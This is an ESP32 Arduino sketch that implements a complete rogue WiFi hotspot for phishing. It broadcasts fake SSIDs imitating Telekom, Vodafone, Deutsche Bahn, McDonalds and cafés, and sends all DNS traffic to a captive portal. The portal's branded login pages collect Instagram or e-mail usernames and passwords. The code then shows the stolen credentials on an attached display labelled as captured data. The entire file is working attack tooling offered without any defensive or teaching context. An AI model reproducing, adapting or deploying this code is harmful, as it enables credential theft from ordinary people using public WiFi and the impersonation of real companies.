#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>

#define LCD_CS    15
#define LCD_DC      2
#define LCD_RST     4
#define LCD_BLK    32
#define BOOT_BTN    0  
#define N3_BTN     14  

Adafruit_ST7789 lcd = Adafruit_ST7789(LCD_CS, LCD_DC, LCD_RST);
WebServer server(80);
DNSServer dnsServer;
IPAddress apIP(172, 217, 28, 1); 

struct Profile {
  String vendor;
  String ssidOptions[2]; 
  String color;      // Hintergrundfarbe Header
  String textColor;  // Textfarbe Header
  String btnColor;   // Buttonfarbe
};

// Farb-Definitionen für die Profile
Profile profiles[] = {
  {"Telekom", {"Telekom_Hilfe", "Telekom_Service"}, "#e20074", "white", "#e20074"},
  {"Vodafone", {"Vodafone_Gast", "Vodafone_Station"}, "#e60000", "white", "#e60000"},
  {"Deutsche Bahn", {"DB Free Wifi", "WIFI@DB"}, "#ff0000", "white", "#ff0000"},
  {"McDonalds", {"McDonalds Free WIFI", "McDonalds_Guest"}, "white", "black", "#27ae60"},
  {"CityCafe", {"City_Wifi_Free", "CityCafe_Guest"}, "white", "black", "#333"},
  {"Cafe Wifi", {"Cafe_Guest_Wifi", "Free_Cafe_Wifi"}, "white", "black", "#d35400"}
};

int currentProfile = 0;
int currentSsidIdx = 0;
String erbeuteteDaten = "Warten...";
String lastMethod = "";

// --- DYNAMISCHES HTML ---

String getPhishingHTML(String view) {
  Profile p = profiles[currentProfile];
  
  String s = "<!DOCTYPE html><html><head><meta charset='UTF-8'>";
  s += "<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>";
  s += "<style>";
  s += "body{font-family:Helvetica,Arial,sans-serif;background:#f4f4f9;margin:0;text-align:center;}";
  s += ".h{background:" + p.color + ";color:" + p.textColor + ";padding:30px;font-size:24px;font-weight:bold;box-shadow:0 2px 4px rgba(0,0,0,0.1);}";
  s += ".c{padding:20px;} .card{background:white;padding:25px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.05);max-width:350px;margin:0 auto;}";
  s += ".btn{display:block;width:100%;padding:15px;margin:10px 0;border-radius:8px;border:none;font-size:16px;font-weight:bold;cursor:pointer;text-decoration:none;}";
  s += ".btn-ig{background:#f09433;background:linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);color:white;}";
  s += ".btn-mail{background:#444;color:white;}";
  s += ".btn-submit{background:" + p.btnColor + ";color:white;margin-top:20px;}";
  s += "input{width:100%;padding:15px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;}";
  s += ".footer{margin-top:20px;font-size:12px;color:#999;}";
  s += "</style></head><body>";
  s += "<div class='h'>" + p.vendor + "</div>";
  s += "<div class='c'><div class='card'>";

  if (view == "start") {
    s += "<h3>Login zum WiFi</h3><p>Wählen Sie eine Methode zur Verifizierung:</p>";
    s += "<a href='/ig' class='btn btn-ig'>Mit Instagram anmelden</a>";
    s += "<a href='/mail' class='btn btn-mail'>Mit E-Mail anmelden</a>";
  } 
  else if (view == "ig") {
    s += "<h3>Instagram Login</h3>";
    s += "<form action='/capture' method='POST'>";
    s += "<input type='hidden' name='method' value='Instagram'>";
    s += "<input type='text' name='user' placeholder='Telefonnummer, Nutzername oder E-Mail' required>";
    s += "<input type='password' name='pass' placeholder='Passwort' required>";
    s += "<button type='submit' class='btn btn-submit'>Einloggen</button></form>";
    s += "<a href='/' style='font-size:14px;color:#666;'>Zurück</a>";
  } 
  else if (view == "mail") {
    s += "<h3>E-Mail Login</h3>";
    s += "<form action='/capture' method='POST'>";
    s += "<input type='hidden' name='method' value='Email'>";
    s += "<input type='email' name='user' placeholder='E-Mail Adresse' required>";
    s += "<input type='password' name='pass' placeholder='E-Mail Passwort' required>";
    s += "<button type='submit' class='btn btn-submit'>Weiter</button></form>";
    s += "<a href='/' style='font-size:14px;color:#666;'>Zurück</a>";
  }

  s += "</div><div class='footer'>&copy; 2026 " + p.vendor + " Hotspot Service</div></div></body></html>";
  return s;
}

// --- SERVER & DISPLAY LOGIK ---

void updateDisplay() {
  lcd.fillScreen(ST77XX_BLACK);
  lcd.fillRect(0, 0, 320, 30, 0x2104);
  lcd.setCursor(10, 7); lcd.setTextColor(ST77XX_WHITE); lcd.setTextSize(2);
  lcd.print("C2: "); lcd.print(profiles[currentProfile].vendor);

  lcd.setCursor(10, 40); lcd.setTextSize(1); lcd.setTextColor(ST77XX_YELLOW);
  lcd.print("SSID: "); lcd.setTextColor(ST77XX_WHITE);
  lcd.println(profiles[currentProfile].ssidOptions[currentSsidIdx]);

  lcd.drawRect(5, 65, 310, 85, ST77XX_GREEN);
  lcd.setCursor(15, 75); lcd.setTextColor(ST77XX_GREEN); 
  lcd.println("GEKAPERTE DATEN (" + lastMethod + "):");
  
  lcd.setCursor(15, 95); lcd.setTextSize(1); lcd.setTextColor(ST77XX_WHITE);
  if(erbeuteteDaten.length() > 40) lcd.setTextSize(1); else lcd.setTextSize(2);
  lcd.println(erbeuteteDaten);

  lcd.setCursor(10, 155); lcd.setTextSize(1); lcd.setTextColor(0x7BEF);
  lcd.print("BOOT: PROFIL | N3: SSID");
}

void setupServer() {
  server.on("/", []() { server.send(200, "text/html", getPhishingHTML("start")); });
  server.on("/ig", []() { server.send(200, "text/html", getPhishingHTML("ig")); });
  server.on("/mail", []() { server.send(200, "text/html", getPhishingHTML("mail")); });

  server.on("/capture", HTTP_POST, []() {
    if (server.hasArg("user") && server.hasArg("pass")) {
      lastMethod = server.arg("method");
      erbeuteteDaten = server.arg("user") + " | " + server.arg("pass");
      updateDisplay();
      server.send(200, "text/html", "<html><body style='text-align:center;padding-top:50px;'><h2>Verbindung erfolgreich!</h2><p>Sie werden nun weitergeleitet.</p></body></html>");
    }
  });

  server.onNotFound([]() { 
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.send(200, "text/html", getPhishingHTML("start")); 
  });
  server.begin();
}

void applyHardwareSettings() {
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(profiles[currentProfile].ssidOptions[currentSsidIdx].c_str());
  dnsServer.start(53, "*", apIP);
  updateDisplay();
}

void setup() {
  pinMode(LCD_BLK, OUTPUT);
  digitalWrite(LCD_BLK, HIGH);
  pinMode(BOOT_BTN, INPUT_PULLUP);
  pinMode(N3_BTN, INPUT_PULLUP);
  lcd.init(170, 320);
  lcd.setRotation(1);
  applyHardwareSettings();
  setupServer();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (digitalRead(BOOT_BTN) == LOW) {
    delay(200);
    int maxP = sizeof(profiles) / sizeof(profiles[0]);
    currentProfile = (currentProfile + 1) % maxP;
    currentSsidIdx = 0;
    erbeuteteDaten = "Warten...";
    lastMethod = "";
    applyHardwareSettings();
    while(digitalRead(BOOT_BTN) == LOW);
  }

  if (digitalRead(N3_BTN) == LOW) {
    delay(200);
    currentSsidIdx = (currentSsidIdx + 1) % 2;
    applyHardwareSettings();
    while(digitalRead(N3_BTN) == LOW);
  }
}
